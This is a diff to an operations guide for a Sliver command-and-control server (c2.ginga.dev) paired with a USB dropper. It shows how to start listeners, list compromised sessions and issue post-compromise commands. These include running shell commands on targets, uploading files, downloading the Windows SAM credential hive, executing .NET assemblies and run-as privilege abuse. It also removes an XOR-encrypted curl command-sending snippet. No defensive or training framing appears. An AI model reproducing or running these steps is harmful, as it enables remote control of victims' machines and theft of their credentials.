@@ -13,15 +13,18 @@
 
 **Host:** c2.ginga.dev (104.131.164.51)  
 **OS:** Ubuntu 24.04 LTS  
+**C2 Framework:** Sliver v1.7.7 (official)
+
 **Services:**
 - Sliver Server daemon (gRPC :31337) — agent control + command queue
-- HTTP Listener (:8080) — agent beacons + polling
+- Sliver HTTP Listener (:8080) — agent beacons + command polling
 - SQLite DB — agent registry
 
-**Endpoints:**
-- `POST /register` — agent beacon on startup (sends: hostname, OS, processes, network)
-- `GET /command?host=HOSTNAME` — agent polls for instructions
-- Response encryption: XOR + Base64 ("stealth-key-123")
+**HTTP Endpoints (Sliver native):**
+- `GET /health` — health check
+- `POST /register` — agent registration (beacon data)
+- `GET /command?host=HOSTNAME` — command polling
+- Response encryption: XOR + Base64 (hardcoded key negotiation)
 
 ---
 
@@ -42,31 +45,33 @@ Skip to "Deploy USB" section.
 ### Option 2: Local C2 (Development)
 
 **Prerequisites:**
-- Sliver v1.7.7 installed
-- Python 3.10+
+- Sliver v1.7.7+ installed
 - Network access from target to C2 host
 
-**Start Sliver daemon:**
+**Start Sliver server + HTTP listener:**
 ```bash
+# Terminal 1: Start Sliver daemon
 sliver-server daemon --listen 0.0.0.0:31337
-```
 
-**Start HTTP listener (mock v2):**
-```bash
-python3 -m http.server 8080 \
-  --directory /tmp/sliver-beacons &
-```
-
-Or use Sliver built-in:
-```bash
+# Terminal 2: Connect to Sliver console
 sliver-client console
+
+# In Sliver console:
 > listener --protocol http --host 0.0.0.0 --port 8080
+# [*] Started HTTP listener: http://0.0.0.0:8080
 ```
 
 **Get your C2 IP:**
 ```bash
 ifconfig | grep inet | grep -v 127
 # Use: http://YOUR_IP:8080
+```
+
+**Verify listener running:**
+```bash
+sliver > listeners
+# [*] Existing HTTP listeners:
+#   http://0.0.0.0:8080
 ```
 
 ---
@@ -262,45 +267,28 @@ cp usb-autorun.inf /Volumes/USB/
 # Checks: PowerShell, Python 3, ps2exe, network connectivity
 ```
 
-### Monitor C2 Beacons (Live)
-
-```bash
-watch -n 1 'ls -lt /tmp/sliver-beacons/ | head -5'
-```
-
-### Parse Beacon Data
-
-```bash
-for f in /tmp/sliver-beacons/beacon_*.json; do
-  echo "=== $(basename $f) ==="
-  jq '.hostname, .os, .proccount, .timestamp' "$f"
-done
-```
-
 ### Send Command to Agent
 
-Via Sliver:
 ```bash
 sliver-client console
-> use <session_id>
+> sessions
+# ID  Name              Hostname        OS      Arch
+# 1   USB-Dropper-001   DESKTOP-ABC123  windows x64
+
+> use 1
 > shell "Get-Process | Select Name"
+> upload /local/file.txt C:\Users\target\file.txt
+> download C:\Windows\System32\config\SAM ./sam_dump
+> exit
 ```
 
-Via HTTP (manual):
-```bash
-# Encrypt command
-python3 -c "
-import base64
-plaintext = 'powershell -c \"whoami\"'
-key = 'stealth-key-123'
-cipher = bytes([plaintext[i % len(plaintext)] ^ key[i % len(key)] for i in range(len(plaintext))])
-print(base64.b64encode(cipher).decode())
-"
-
-# Send encrypted response
-curl -X GET "http://localhost:8080/command?host=DESKTOP-ABC123" \
-  -d "aGHQ3Jk8mNp2XqRtYvWxZaBc..."
-```
+**Available Sliver commands (post-compromise):**
+- `shell "command"` — execute PowerShell/cmd
+- `upload local remote` — transfer file to target
+- `download remote local` — exfiltrate file from target
+- `ps` — list processes
+- `execute-assembly /path/assembly.exe` — run .NET assembly
+- `run-as /user:DOMAIN\user /password:pass command` — privilege abuse
 
 ---
 
